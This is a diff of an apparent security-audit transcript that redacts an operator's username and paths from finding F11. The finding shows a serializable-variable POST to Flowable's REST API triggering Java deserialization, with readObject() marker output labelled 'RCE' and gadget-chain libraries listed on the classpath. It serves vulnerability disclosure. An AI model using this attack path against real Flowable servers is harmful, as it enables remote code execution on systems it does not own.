@@ -1,14 +1,18 @@
+[redaction note] the operator's username and absolute filesystem paths were
+replaced with placeholders in this transcript. No other content was altered;
+HTTP status codes, byte counts, class names and values are verbatim.
+
 
 === F11: unfiltered Java deserialization via serializable runtime variable ===
 $ POST /flowable-rest/service/runtime/process-instances/<id>/variables  (type=serializable, 30-byte probe)
 HTTP 201 {"name":"pwned","scope":"local","type":"serializable","valueUrl":".../variables/pwned/data"}
 
 --- marker file created by readObject() inside the Flowable JVM ---
-RCE at 1790926723558 jvm=17.0.20.1 user=rinne cwd=/Users/rinne/Desktop/github/flowable-engine
-RCE at 1790926723575 jvm=17.0.20.1 user=rinne cwd=/Users/rinne/Desktop/github/flowable-engine
+RCE at 1790926723558 jvm=17.0.20.1 user=<operator> cwd=<flowable-checkout>
+RCE at 1790926723575 jvm=17.0.20.1 user=<operator> cwd=<flowable-checkout>
 --- application stdout ---
-[CVE-PROBE] readObject executed -> /Users/rinne/security-audit-skill/flowable-engine/run-1/lab/flowable-deser-pwned
-[CVE-PROBE] readObject executed -> /Users/rinne/security-audit-skill/flowable-engine/run-1/lab/flowable-deser-pwned
+[CVE-PROBE] readObject executed -> <redacted>
+[CVE-PROBE] readObject executed -> <redacted>
 
 --- a real gadget chain is present on the classpath but CC is self-gated ---
 classpath: commons-collections-3.2.2.jar, commons-beanutils-1.11.0.jar, groovy-5.0.5.jar
